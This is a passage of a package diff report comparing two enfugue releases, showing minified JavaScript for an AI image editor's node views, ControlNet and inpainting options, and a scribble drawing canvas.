+import{NodeView,OptionsNodeView}from"./base.mjs";import{ImageView,BackgroundImageView}from"../image.mjs";import{NodeEditorView}from"./editor.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty}from"../../base/helpers.mjs";import{SimpleNotification}from"../../common/notify.mjs";import{FormView}from"../forms/base.mjs";import{ToolbarView}from"../menu.mjs";import{ScribbleView}from"../scribble.mjs";import{SelectInputView,CheckboxInputView,FloatInputView,NumberInputView,TextInputView}from"../forms/input.mjs";const E=new ElementBuilder,filterEmpty=e=>{let t={};for(let i in e)isEmpty(e[i])||(t[i]=e[i]);return t};class InvocationToolbarView extends ToolbarView{constructor(e){super(e.config),this.invocationNode=e}async onMouseEnter(e){this.invocationNode.toolbarEntered()}async onMouseLeave(e){this.invocationNode.toolbarLeft()}async build(){let e=await super.build();return e.on("mouseenter",(e=>this.onMouseEnter(e))),e.on("mouseleave",(e=>this.onMouseLeave(e))),e}}class CurrentInvocationImageView extends ImageView{constructor(e){super(e.config),this.editor=e}static className="current-invocation-image-view";static hideTime=250;async getTools(){return isEmpty(this.toolbar)&&(this.toolbar=new InvocationToolbarView(this),navigator.clipboard&&"function"==typeof ClipboardItem&&(this.copyImage=await this.toolbar.addItem("Copy to Clipboard","fa-solid fa-clipboard"),this.copyImage.onClick((()=>this.copyToClipboard()))),this.popoutImage=await this.toolbar.addItem("Popout Image","fa-solid fa-arrow-up-right-from-square"),this.popoutImage.onClick((()=>this.sendToWindow())),this.saveImage=await this.toolbar.addItem("Save As","fa-solid fa-floppy-disk"),this.saveImage.onClick((()=>this.saveToDisk())),this.editImage=await this.toolbar.addItem("Edit Image","fa-solid fa-pen-to-square"),this.editImage.onClick((()=>this.sendToCanvas()))),this.toolbar}async copyToClipboard(){navigator.clipboard.write([new ClipboardItem({"image/png":await this.getBlob()})]),SimpleNotification.notify("Copied to clipboard!",2e3)}async saveToDisk(){this.editor.application.saveBlobAs("Save Image",await this.getBlob(),".png")}async sendToCanvas(){this.editor.application.initializeStateFromImage(await this.getImageAsDataURL())}async sendToWindow(){window.open(this.src)}async toolbarEntered(){this.stopHideTimer()}async toolbarLeft(){this.startHideTimer()}stopHideTimer(){clearTimeout(this.timer)}startHideTimer(){this.timer=setTimeout((async()=>{let e=await this.lock.acquire(),t=await this.getTools();this.node.element.parentElement.removeChild(await t.render()),e()}),this.constructor.hideTime)}async onMouseEnter(e){this.stopHideTimer();let t=await this.lock.acquire(),i=await this.getTools();this.node.element.parentElement.appendChild(await i.render()),t()}async onMouseLeave(e){this.startHideTimer()}async build(){let e=await super.build();return e.on("mouseenter",(e=>this.onMouseEnter(e))),e.on("mouseleave",(e=>this.onMouseLeave(e))),e}}class ImageEditorImageControlNetInputView extends SelectInputView{static defaultValue="canny";static defaultOptions={canny:"Canny Edge Detection",hed:"Holistically-nested Edge Detection (HED)",pidi:"Soft Edge Detection (PIDI)",mlsd:"Mobile Line Segment Detection (MLSD)",line:"Line Art",anime:"Anime Line Art",scribble:"Scribble",depth:"Depth Detection (MiDaS)",normal:"Normal Detection (Estimate)",pose:"Pose Detection (OpenPose)"};static tooltip="The ControlNet to use depends on your input image. Unless otherwise specified, your input image will be processed through the appropriate algorithm for this ControlNet prior to diffusion.<br /><strong>Canny Edge</strong>: This network is trained on images and the edges of that image after having run through Canny Edge detection.<br /><strong>HED</strong>: Short for Holistically-Nested Edge Detection, this edge-detection algorithm is best used when the input image is too blurry or too noisy for Canny Edge detection.<br /><strong>Soft Edge Detection</strong>: Using a Pixel Difference Network, this edge-detection algorithm can be used in a wide array of applications.<br /><strong>MLSD</strong>: Short for Mobile Line Segment Detection, this edge-detection algorithm searches only for straight lines, and is best used for geometric or architectural images.<br /><strong>Line Art</strong>: This model is capable of rendering images to line art drawings. The controlnet was trained on the model output, this provides a great way to provide your own hand-drawn pieces as well as another means of edge detection.<br /><strong>Anime Line Art</strong>: This is similar to the above, but focusing specifically on anime style.<br /><strong>Scribble</strong>: This ControlNet was trained on a variant of the HED edge-detection algorithm, and is good for hand-drawn scribbles with thick, variable lines.<br /><strong>Depth</strong>: This uses Intel's MiDaS model to estimate monocular depth from a single image. This uses a greyscale image showing the distance from the camera to any given object.<br /><strong>Normal</strong>: Normal maps are similar to depth maps, but instead of using a greyscale depth, three sets of distance data is encoded into red, green and blue channels.<br /><strong>OpenPose</strong>: This AI model from the Carnegie Mellon University's Perceptual Computing Lab detects human limb, face and digit poses from an image. Using this data, you can generate different people in the same pose."}class ImageEditorImageFitInputView extends SelectInputView{static defaultValue="actual";static defaultOptions={actual:"Actual Size",stretch:"Stretch",contain:"Contain",cover:"Cover"};static tooltip="Fit this image within it's container.<br /><strong>Actual</strong>: Do not manipulate the dimensions of the image, anchor it as specified in the frame.<br /><strong>Stretch</strong>: Force the image to fit within the frame, regardles sof original dimensions. When using this mode, anchor has no effect.<br /><strong>Contain</strong>: Scale the image so that it's largest dimension is contained within the frames bounds, adding negative space to fill the rest of the frame.<br /><strong>Cover</strong>: Scale the image so that it's smallest dimension is contained within the frame bounds, cropping the rest of the image as needed."}class ImageEditorImageAnchorInputView extends SelectInputView{static defaultValue="top-left";static defaultOptions={"top-left":"Top Left","top-center":"Top Center","top-right":"Top Right","center-left":"Center Left","center-center":"Center Center","center-right":"Center Right","bottom-left":"Bottom Left","bottom-center":"Bottom Center","bottom-right":"Bottom Right"};static tooltip="When the size of the frame and the size of the image do not match, this will control where the image is placed. View the 'fit' field for more options to fit images in the frame."}class ImageEditorBaseOptionsFormView extends FormView{static fieldSets={Prompts:{prompt:{label:"Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in this frame. When left blank, the global prompt will be used."}},negativePrompt:{label:"Negative Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in not this frame. When left blank, the global negative prompt will be used."}}},Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,step:.1,value:null,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,step:1,value:null,tooltip:"How many steps to take during primary inference, larger values take longer to process."}}},Other:{scaleToModelSize:{label:"Scale to Model Size",class:CheckboxInputView,config:{tooltip:"When this node has any dimension smaller than the size of the configured model, scale it up so it's smallest dimension is the same size as the model, then scale it down after diffusion.<br />This generally improves image quality in slightly rectangular shapes or square shapes smaller than the engine size, but can also result in ghosting and increased processing time.<br />This will have no effect if your node is larger than the model size in all dimensions.<br />If unchecked and your node is smaller than the model size, TensorRT will be disabled for this node."}},removeBackground:{label:"Remove Background",class:CheckboxInputView,config:{tooltip:"After diffusion, run the resulting image though an AI background removal algorithm. This can improve image consistency when using multiple nodes."}}}};static autoSubmit=!0;static className="options-form-view"}class ImageColorSpaceInputView extends SelectInputView{static defaultOptions={invert:"White on Black"};static defaultValue="invert";static placeholder="Black on White";static allowEmpty=!0}class ImageEditorImageNodeOptionsFormView extends FormView{static fieldSets={Base:{fit:{label:"Image Fit",class:ImageEditorImageFitInputView},anchor:{label:"Image Anchor",class:ImageEditorImageAnchorInputView},inpaint:{label:"Use for Inpainting",class:CheckboxInputView,config:{tooltip:"When checked, you will be able to paint where on the image you wish for the AI to fill in details. Any gaps in the frame or transparency in the image will also be filled."}},infer:{label:"Use for Inference",class:CheckboxInputView,config:{tooltip:"When checked, use this image as input for primary diffusion. Inpainting will be performed first, filling any painted sections as well as gaps in the frame and transparency in the image."}},control:{label:"Use for Control",class:CheckboxInputView,config:{tooltip:"When checked, use this image as input for ControlNet. Inpainting will be performed first, filling any painted sections as well as gaps in the frame and transparency in the image.<br />Unless otherwise specified, your image will be processed using the appropriate algorithm for the chosen ControlNet."}}},Other:{scaleToModelSize:{label:"Scale to Model Size",class:CheckboxInputView,config:{tooltip:"When this has any dimension smaller than the size of the configured model, scale it up so it's smallest dimension is the same size as the model, then scale it down after diffusion.<br />This generally improves image quality in rectangular shapes, but can also result in ghosting and increased processing time.<br />This will have no effect if your node is larger than the model size in all dimensions.<br />If unchecked and your node is smaller than the model size, TensorRT will be disabled for this node."}},removeBackground:{label:"Remove Background",class:CheckboxInputView,config:{tooltip:"Before processing, run this image through an AI background removal process. If you are additionally inpainting, inferencing or using this image for ControlNet, that background will then be filled in within this frame. If you are not, that background will be filled when the overall canvas image is finally painted in."}}},Prompts:{prompt:{label:"Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in this frame. When left blank, the global prompt will be used."}},negativePrompt:{label:"Negative Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in not this frame. When left blank, the global negative prompt will be used."}}},Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,step:.1,value:null,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,step:1,value:null,tooltip:"How many steps to take during primary inference, larger values take longer to process."}}},Inference:{strength:{label:"Denoising Strength",class:FloatInputView,config:{min:0,max:1,step:.01,value:.8,config:"How much of the input image to replace with new information. A value of 1.0 represents total input image destruction, and 0.0 represents no image modifications being made."}}},Control:{controlnet:{label:"ControlNet",class:ImageEditorImageControlNetInputView},conditioningScale:{label:"Conditioning Scale",class:FloatInputView,config:{min:0,max:1,step:.01,value:1,config:"How closely to follow ControlNet's influence."}},processControlImage:{label:"Process Image for ControlNet",class:CheckboxInputView,config:{value:!0,tooltip:"When checked, the image will be processed through the appropriate edge detection algorithm for the ControlNet. Only uncheck this if your image has already been processed through edge detection."}}},"Color Space":{colorSpace:{label:"Input Image Color Space",class:ImageColorSpaceInputView}}};static fieldSetConditions={Prompts:e=>e.infer||e.inpaint||e.control,Tweaks:e=>e.infer||e.inpaint||e.control,Inference:e=>e.infer,Control:e=>e.control,"Color Space":e=>e.control&&-1!==["mlsd","hed","pidi","scribble","line","anime"].indexOf(e.controlnet)&&!1===e.processControlImage};static autoSubmit=!0;static className="image-options-form-view"}class ImageEditorNodeView extends NodeView{static canFlipHeader=!0;static minHeight=32;static minWidth=32;static snapSize=8;static padding=8;static edgeHandlerTolerance=8;static hideHeader=!0;static closeText="Remove";static nodeButtons={anchor:{icon:"fa-solid fa-sliders",tooltip:"Show/Hide Options",callback:function(){this.toggleOptions()}}};static optionsFormView=ImageEditorBaseOptionsFormView;async updateOptions(e){this.prompt=e.prompt,this.negativePrompt=e.negativePrompt,this.guidanceScale=e.guidanceScale,this.inferenceSteps=e.inferenceSteps,this.scaleToModelSize=e.scaleToModelSize,this.removeBackground=e.removeBackground}async toggleOptions(){if(isEmpty(this.optionsForm)){this.optionsForm=new this.constructor.optionsFormView(this.config),this.optionsForm.onSubmit((e=>this.updateOptions(e)));let e=await this.optionsForm.getNode();this.optionsForm.setValues(this.getState()),this.node.find("enfugue-node-contents").append(e)}else this.optionsForm.hidden?this.optionsForm.show():this.optionsForm.hide()}setState(e){super.setState({name:e.name,x:e.x-this.constructor.padding,y:e.y-this.constructor.padding,h:e.h+2*this.constructor.padding,w:e.w+2*this.constructor.padding}),this.updateOptions(e),isEmpty(this.optionsForm)||this.optionsForm.setValues(e)}getState(){let e=super.getState();return e.prompt=this.prompt||null,e.negativePrompt=this.negativePrompt||null,e.guidanceScale=this.guidanceScale||null,e.inferenceSteps=this.inferenceSteps||null,e.removeBackground=this.removeBackground||!1,e.scaleToModelSize=this.scaleToModelSize||!1,e}}class ImageEditorPromptNodeView extends ImageEditorNodeView{static hideHeader=!1;static canFlipHeader=!1;static nodeName="Prompt";static nodeButtons={};static className="image-editor-prompt-node-view";constructor(e,t,i,o,n,s,a){let r=new ImageEditorBaseOptionsFormView(e.config);super(e,t,r,o,n,s,a),r.onSubmit((e=>this.updateOptions(e)))}getState(){let e=super.getState();return e={...e,...this.content.values},e}async setState(e){await super.setState(e),await this.content.getNode(),await this.content.setValues(e)}}class ImageEditorScribbleNodeView extends ImageEditorNodeView{static pencilSquareIcon="fa-regular fa-square";static pencilSquareTooltip="Change Pencil Shape to Square";static pencilCircleIcon="fa-regular fa-circle";static pencilCircleTooltip="Change Pencil Shape to Circle";static eraserIcon="fa-solid fa-eraser";static eraserTooltip="Switch to Eraser (Hold <code>alt</code> To Quick-Toggle)";static pencilIcon="fa-solid fa-pencil";static pencilTooltip="Switch Back to Pencil";static nodeButtons={...ImageEditorNodeView.nodeButtons,shape:{icon:ImageEditorScribbleNodeView.pencilSquareIcon,tooltip:ImageEditorScribbleNodeView.pencilSquareTooltip,callback:function(){this.togglePencilShape()}},erase:{icon:ImageEditorScribbleNodeView.eraserIcon,tooltip:ImageEditorScribbleNodeView.eraserTooltip,callback:function(){this.toggleEraser()}},clear:{icon:"fa-solid fa-delete-left",tooltip:"Clear the entire canvas.",callback:function(){this.scribbleView.clearMemory()}},increase:{icon:"fa-solid fa-plus",tooltip:"Increase Pencil Size",callback:function(){this.scribbleView.increaseSize()}},decrease:{icon:"fa-solid fa-minus",tooltip:"Decrease Pencil Size",callback:function(){this.scribbleView.decreaseSize()}}};togglePencilShape(){let e=this.scribbleView.shape,t=this.node.find(".node-button-shape"),i=t.find("i");"circle"===e?(this.scribbleView.shape="square",t.data("tooltip",this.constructor.pencilCircleTooltip),i.class(this.constructor.pencilCircleIcon)):(this.scribbleView.shape="circle",t.data("tooltip",this.constructor.pencilSquareTooltip),i.class(this.constructor.pencilSquareIcon))}toggleEraser(){let e=!0===this.scribbleView.isEraser,t=this.node.find(".node-button-erase"),i=t.find("i");e?(this.scribbleView.isEraser=!1,t.data("tooltip",this.constructor.eraserTooltip),i.class(this.constructor.eraserIcon)):(this.scribbleView.isEraser=!0,this.scribbleView.shape="circle",t.data("tooltip",this.constructor.pencilTooltip),i.class(this.constructor.pencilIcon))}constructor(e,t,i,o,n,s,a){super(e,t,new ScribbleView(e.config,s,a),o,n,s,a),this.scribbleView=this.content}async resized(){super.resized(),this.scribbleView.resizeCanvas(this.visibleWidth-2*this.constructor.padding,this.visibleHeight-2*this.constructor.padding)}getState(){let e=super.getState();return e.src=this.scribbleView.src,e}setState(e){if(super.setState(e),isEmpty(e.src))this.scribbleView.clearMemory();else{let t=new Image;t.onload=()=>this.scribbleView.setMemory(t),t.src=e.src}}}class ImageEditorImageNodeView extends ImageEditorScribbleNodeView{static allFitModes=["actual","stretch","cover","contain"];static allAnchorModes=["top-left","top-center","top-right","center-left","center-center","center-right","bottom-left","bottom-center","bottom-right"];static scribbleButtons=["erase","shape","clear","increase","decrease"];static className="image-editor-image-node-view";static nodeButtons={...ImageEditorScribbleNodeView.nodeButtons,"mirror-x":{icon:"fa-solid fa-left-right",tooltip:"Mirror the image horizontally.",callback:function(){this.mirrorHorizontally()}},"mirror-y":{icon:"fa-solid fa-up-down",tooltip:"Mirror the image vertically.",callback:function(){this.mirrorVertically()}},"rotate-clockwise":{icon:"fa-solid fa-rotate-right",tooltip:"Rotate the image clockwise by 90 degrees.",callback:function(){this.rotateClockwise()}},"rotate-counter-clockwise":{icon:"fa-solid fa-rotate-left",tooltip:"Rotate the image counter-clockwise by 90 degrees.",callback:function(){this.rotateCounterClockwise()}}};static optionsFormView=ImageEditorImageNodeOptionsFormView;constructor(e,t,i,o,n,s,a){i instanceof ImageView&&(i=new BackgroundImageView(i.config,i.src)),super(e,t,null,o,n,s,a),this.scribbleView=this.content,this.content=i,this.scribbleView.hide()}async updateOptions(e){if(super.updateOptions(e),this.updateFit(e.fit),this.updateAnchor(e.anchor),this.infer=e.infer,this.control=e.control,this.inpaint=e.inpaint,this.strength=e.strength,this.controlnet=e.controlnet,this.conditioningScale=e.conditioningScale,this.processControlImage=e.processControlImage,void 0!==this.node){let e=this.node.find("enfugue-node-header");if(this.inpaint){this.scribbleView.show();for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).show()}else{this.scribbleView.hide();for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).hide()}}}async updateFit(e){this.fit=e;let t=await this.getContent();t.fit=e;for(let e of this.constructor.allFitModes)t.removeClass(`fit-${e}`);isEmpty(e)||t.addClass(`fit-${e}`)}async updateAnchor(e){this.anchor=e;let t=await this.getContent();for(let e of this.constructor.allAnchorModes)t.removeClass(`anchor-${e}`);isEmpty(e)||t.addClass(`anchor-${e}`)}async build(){let e=await super.build();e.find("enfugue-node-contents").append(await this.scribbleView.getNode());let t=e.find("enfugue-node-header");for(let e of this.constructor.scribbleButtons)t.find(`.node-button-${e}`).hide();return e}mirrorHorizontally(){return this.content.mirrorHorizontally()}mirrorVertically(){return this.content.mirrorVertically()}rotateClockwise(){return this.content.rotateClockwise()}rotateCounterClockwise(){return this.content.rotateCounterClockwise()}getState(){let e=super.getState();return e.scribbleSrc=this.scribbleView.src,e.src=this.content.src,e.anchor=this.anchor||null,e.fit=this.fit||null,e.infer=this.infer||!1,e.control=this.control||!1,e.inpaint=this.inpaint||!1,e.strength=this.strength||.8,e.controlnet=this.controlnet||null,e.colorSpace=this.colorSpace||"invert",e.conditioningScale=this.conditioningScale||1,e.processControlImage=!1!==this.processControlImage,e.removeBackground=!0===this.removeBackground,e.scaleToModelSize=!0===this.scaleToModelSize,e}async setState(e){if(await this.setContent(new BackgroundImageView(this.config,e.src)),await this.updateAnchor(e.anchor),await this.updateFit(e.fit),e.inpaint){let t=new Image;t.onload=()=>{if(this.scribbleView.setMemory(t),this.scribbleView.show(),void 0!==this.node){let e=this.node.find("enfugue-node-header");for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).show()}},t.src=e.scribbleSrc}else if(this.scribbleView.clearMemory(),this.scribbleView.hide(),void 0!==this.node){let e=this.node.find("enfugue-node-header");for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).hide()}await super.setState({...e,src:null})}static getDefaultState(){return{classname:this.name,inpaint:!1,control:!1,inpaint:!1,inferenceSteps:null,guidanceScale:null,strength:.8,processControlImage:!0,colorSpace:"invert",conditioningScale:1,removeBackground:!1,scaleToModelSize:!1}}}class ImageEditorView extends NodeEditorView{constructor(e){super(e.config,window.innerWidth-300,window.innerHeight-70),this.application=e}static canvasWidth=512;static canvasHeight=512;static centered=!0;static className="image-editor";static maximumZoom=10;static nodeClasses=[ImageEditorScribbleNodeView,ImageEditorImageNodeView,ImageEditorPromptNodeView];hideCurrentInvocation(){this.currentInvocation.hide(),this.removeClass("has-image"),isEmpty(this.configuredWidth)||isEmpty(this.configuredHeight)||(this.width=this.configuredWidth,this.height=this.configuredHeight,this.configuredHeight=null,this.configuredWidth=null)}async setCurrentInvocationImage(e){this.currentInvocation.setImage(e),await this.currentInvocation.waitForLoad(),this.currentInvocation.width==this.width&&this.currentInvocation.height==this.height||(isEmpty(this.configuredWidth)&&(this.configuredWidth=this.width),isEmpty(this.configuredHeight)&&(this.configuredHeight=this.height),this.width=this.currentInvocation.width,this.height=this.currentInvocation.height),this.currentInvocation.show(),this.addClass("has-image")}getNextNodePoint(){let e=this.nodes.map((e=>e.left+ImageEditorNodeView.padding)),t=this.nodes.map((e=>e.top+ImageEditorNodeView.padding)),[i,o]=[0,0];for(;-1!==e.indexOf(i);)i+=ImageEditorNodeView.snapSize;for(;-1!==t.indexOf(o);)o+=ImageEditorNodeView.snapSize;return[i,o]}async addImageNode(e,t="Image"){let i=new ImageView(this.config,e),[o,n]=this.getNextNodePoint();return await i.waitForLoad(),await this.addNode(ImageEditorImageNodeView,t,i,o,n,i.width,i.height)}async addScribbleNode(e="Scribble"){let[t,i]=this.getNextNodePoint();return await this.addNode(ImageEditorScribbleNodeView,e,null,t,i,256,256)}async addPromptNode(e="Prompt"){let[t,i]=this.getNextNodePoint();return await this.addNode(ImageEditorPromptNodeView,e,null,t,i,256,256)}async build(){let e=await super.build(),t=E.createElement("enfugue-image-editor-grid");return this.currentInvocation=new CurrentInvocationImageView(this),this.currentInvocation.hide(),e.find("enfugue-node-canvas").append(t,await this.currentInvocation.getNode()),e}static getNodeDataForImage(e){return{...{x:0,y:0,w:e.width,h:e.height,src:e.src,name:"Initial Image"},...ImageEditorImageNodeView.getDefaultState()}}}export{ImageEditorView,ImageEditorNodeView,ImageEditorImageNodeView,ImageEditorScribbleNodeView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/nodes/windows.mjs` & `enfugue-0.2.0/enfugue/static/js/view/nodes/windows.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/notifications.mjs` & `enfugue-0.2.0/enfugue/static/js/view/notifications.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/scribble.mjs` & `enfugue-0.2.0/enfugue/static/js/view/scribble.mjs`

 * *Files 2% similar despite different names*

```diff
@@ -1 +1 @@
-import{View,ParentView}from"./base.mjs";import{ElementBuilder}from"../base/builder.mjs";import{isEmpty}from"../base/helpers.mjs";const E=new ElementBuilder;class ScribbleView extends View{static tagName="enfugue-scribble-view";static defaultPencilSize=6;static maximumPencilSize=100;static defaultPencilShape="circle";constructor(e,t,i){super(e),this.width=t,this.height=i,this.active=!1,this.shape=this.constructor.defaultPencilShape,this.size=this.constructor.defaultPencilSize,this.isEraser=!1,this.memoryCanvas=document.createElement("canvas"),this.visibleCanvas=document.createElement("canvas"),isEmpty(t)||isEmpty(i)||(this.memoryCanvas.width=t,this.memoryCanvas.height=i,this.visibleCanvas.width=t,this.visibleCanvas.height=i)}get src(){return this.updateVisibleCanvas(),this.visibleCanvas.toDataURL()}clearMemory(){this.memoryCanvas.getContext("2d").clearRect(0,0,this.memoryCanvas.width,this.memoryCanvas.height),this.updateVisibleCanvas()}setMemory(e){let t=document.createElement("canvas");t.width=e.width,t.height=e.height,this.visibleCanvas.width=t.width,this.visibleCanvas.height=t.height,t.getContext("2d").drawImage(e,0,0),this.memoryCanvas=t,this.updateVisibleCanvas()}resizeCanvas(e,t){if(this.width=e,this.height=t,this.visibleCanvas.width=e,this.visibleCanvas.height=t,e>this.memoryCanvas.width||t>this.memoryCanvas.height){let i=document.createElement("canvas");i.width=e,i.height=t,i.getContext("2d").drawImage(this.memoryCanvas,0,0),this.memoryCanvas=i}this.updateVisibleCanvas()}updateVisibleCanvas(){let e=this.visibleCanvas.getContext("2d");e.beginPath(),e.rect(0,0,this.width,this.height),e.fillStyle="white",e.fill(),e.drawImage(this.memoryCanvas,0,0)}getCoordinates(e){return[e.offsetX,e.offsetY]}onNodeMouseEnter(e){this.active=!1}onNodeMouseLeave(e){this.active=!1,this.updateVisibleCanvas(),this.lastX=null,this.lastY=null}onNodeMouseDown(e){if(1!==e.which)return;e.preventDefault(),e.stopPropagation(),this.active=!0;let[t,i]=this.getCoordinates(e);isEmpty(this.lastX)||isEmpty(this.lastY)||!e.shiftKey||this.drawLineTo(t,i),e.altKey||this.isEraser?this.erase(t,i):this.drawMemory(t,i)}onNodeMouseUp(e){this.active=!1}onNodeMouseMove(e){let[t,i]=this.getCoordinates(e);if(!isEmpty(this.lastDrawTime)&&!e.altKey&&!this.isEraser){(new Date).getTime()-this.lastDrawTime<50&&this.drawLineTo(t,i)}this.active?(e.preventDefault(),e.stopPropagation(),e.altKey||this.isEraser?this.erase(t,i):this.drawMemory(t,i)):this.drawVisible(t,i)}decreaseSize(){this.size=Math.max(2,this.size-2)}increaseSize(){this.size=Math.min(this.constructor.maximumPencilSize,this.size+2)}onNodeWheel(e){if(e.ctrlKey)return void e.preventDefault();e.deltaY>0?this.decreaseSize():this.increaseSize();let[t,i]=this.getCoordinates(e);this.drawVisible(t,i),e.preventDefault(),e.stopPropagation()}erase(e,t){let i=this.memoryCanvas.getContext("2d");i.save(),this.drawPencilShape(i,e,t),i.clip(),i.clearRect(0,0,this.memoryCanvas.width,this.memoryCanvas.height),i.restore(),this.updateVisibleCanvas()}drawMemory(e,t){let i=this.memoryCanvas.getContext("2d");this.drawPencilShape(i,e,t),i.fillStyle="#000000",i.fill(),this.updateVisibleCanvas(),this.lastX=e,this.lastY=t,this.lastDrawTime=(new Date).getTime()}drawVisible(e,t){this.updateVisibleCanvas();let i=this.visibleCanvas.getContext("2d");this.size-=1,this.drawPencilShape(i,e,t),i.strokeStyle="#ffffff",i.lineWidth=1,i.stroke(),this.size+=1,this.drawPencilShape(i,e,t),i.strokeStyle="#000000",i.lineWidth=1,i.stroke()}drawLineTo(e,t){let i=this.memoryCanvas.getContext("2d");i.beginPath(),i.moveTo(this.lastX,this.lastY),i.lineTo(e,t),i.strokeStyle="#000000",i.lineWidth=this.size,i.stroke()}drawPencilShape(e,t,i){if(e.beginPath(),"circle"===this.shape)e.arc(t,i,this.size/2,0,2*Math.PI);else{let s=Math.max(0,t-this.size/2),a=Math.max(0,i-this.size/2),h=Math.min(s+this.size,this.width),n=Math.min(a+this.size,this.height);e.moveTo(s,a),e.lineTo(h,a),e.lineTo(h,n),e.lineTo(s,n),e.lineTo(s,a)}}async build(){let e=await super.build();return e.append(this.visibleCanvas),e.on("dblclick",(e=>{e.preventDefault(),e.stopPropagation()})),e.on("mouseenter",(e=>this.onNodeMouseEnter(e))),e.on("mousemove",(e=>this.onNodeMouseMove(e))),e.on("mousedown",(e=>this.onNodeMouseDown(e))),e.on("mouseup",(e=>this.onNodeMouseUp(e))),e.on("mouseleave",(e=>this.onNodeMouseLeave(e))),e.on("wheel",(e=>this.onNodeWheel(e))),this.updateVisibleCanvas(),e}}export{ScribbleView};
+import{View,ParentView}from"./base.mjs";import{ElementBuilder}from"../base/builder.mjs";import{isEmpty}from"../base/helpers.mjs";const E=new ElementBuilder;class ScribbleView extends View{static tagName="enfugue-scribble-view";static defaultPencilSize=6;static maximumPencilSize=100;static defaultPencilShape="circle";constructor(e,t,i){super(e),this.width=t,this.height=i,this.active=!1,this.shape=this.constructor.defaultPencilShape,this.size=this.constructor.defaultPencilSize,this.isEraser=!1,this.memoryCanvas=document.createElement("canvas"),this.visibleCanvas=document.createElement("canvas"),isEmpty(t)||isEmpty(i)||(this.memoryCanvas.width=t,this.memoryCanvas.height=i,this.visibleCanvas.width=t,this.visibleCanvas.height=i)}get src(){return this.updateVisibleCanvas(),this.visibleCanvas.toDataURL()}clearMemory(){this.memoryCanvas.getContext("2d").clearRect(0,0,this.memoryCanvas.width,this.memoryCanvas.height),this.updateVisibleCanvas()}setMemory(e){let t=document.createElement("canvas");t.width=e.width,t.height=e.height,this.visibleCanvas.width=t.width,this.visibleCanvas.height=t.height,t.getContext("2d").drawImage(e,0,0),this.memoryCanvas=t,this.updateVisibleCanvas()}resizeCanvas(e,t){if(this.width=e,this.height=t,this.visibleCanvas.width=e,this.visibleCanvas.height=t,e>this.memoryCanvas.width||t>this.memoryCanvas.height){let i=document.createElement("canvas");i.width=e,i.height=t,i.getContext("2d").drawImage(this.memoryCanvas,0,0),this.memoryCanvas=i}this.updateVisibleCanvas()}updateVisibleCanvas(){let e=this.visibleCanvas.getContext("2d");e.beginPath(),e.rect(0,0,this.width,this.height),e.fillStyle="white",e.fill(),e.drawImage(this.memoryCanvas,0,0)}getCoordinates(e){return[e.offsetX,e.offsetY]}onNodeMouseEnter(e){this.active=!1}onNodeMouseLeave(e){this.active=!1,this.updateVisibleCanvas(),this.lastX=null,this.lastY=null}onNodeMouseDown(e){if(1!==e.which)return;e.preventDefault(),e.stopPropagation(),this.active=!0;let[t,i]=this.getCoordinates(e);isEmpty(this.lastX)||isEmpty(this.lastY)||!e.shiftKey||this.drawLineTo(t,i),e.altKey||this.isEraser?this.erase(t,i):this.drawMemory(t,i)}onNodeMouseUp(e){this.active=!1}onNodeMouseMove(e){let[t,i]=this.getCoordinates(e);if(!isEmpty(this.lastDrawTime)&&!e.altKey&&!this.isEraser){(new Date).getTime()-this.lastDrawTime<50&&this.drawLineTo(t,i)}this.active?(e.preventDefault(),e.stopPropagation(),e.altKey||this.isEraser?this.erase(t,i):this.drawMemory(t,i)):this.drawVisible(t,i)}decreaseSize(){this.size=Math.max(2,this.size-2)}increaseSize(){this.size=Math.min(this.constructor.maximumPencilSize,this.size+2)}onNodeWheel(e){if(e.ctrlKey||e.metaKey)return void e.preventDefault();e.deltaY>0?this.decreaseSize():this.increaseSize();let[t,i]=this.getCoordinates(e);this.drawVisible(t,i),e.preventDefault(),e.stopPropagation()}erase(e,t){let i=this.memoryCanvas.getContext("2d");i.save(),this.drawPencilShape(i,e,t),i.clip(),i.clearRect(0,0,this.memoryCanvas.width,this.memoryCanvas.height),i.restore(),this.updateVisibleCanvas()}drawMemory(e,t){let i=this.memoryCanvas.getContext("2d");this.drawPencilShape(i,e,t),i.fillStyle="#000000",i.fill(),this.updateVisibleCanvas(),this.lastX=e,this.lastY=t,this.lastDrawTime=(new Date).getTime()}drawVisible(e,t){this.updateVisibleCanvas();let i=this.visibleCanvas.getContext("2d");this.size-=1,this.drawPencilShape(i,e,t),i.strokeStyle="#ffffff",i.lineWidth=1,i.stroke(),this.size+=1,this.drawPencilShape(i,e,t),i.strokeStyle="#000000",i.lineWidth=1,i.stroke()}drawLineTo(e,t){let i=this.memoryCanvas.getContext("2d");i.beginPath(),i.moveTo(this.lastX,this.lastY),i.lineTo(e,t),i.strokeStyle="#000000",i.lineWidth=this.size,i.stroke()}drawPencilShape(e,t,i){if(e.beginPath(),"circle"===this.shape)e.arc(t,i,this.size/2,0,2*Math.PI);else{let s=Math.max(0,t-this.size/2),a=Math.max(0,i-this.size/2),h=Math.min(s+this.size,this.width),n=Math.min(a+this.size,this.height);e.moveTo(s,a),e.lineTo(h,a),e.lineTo(h,n),e.lineTo(s,n),e.lineTo(s,a)}}async build(){let e=await super.build();return 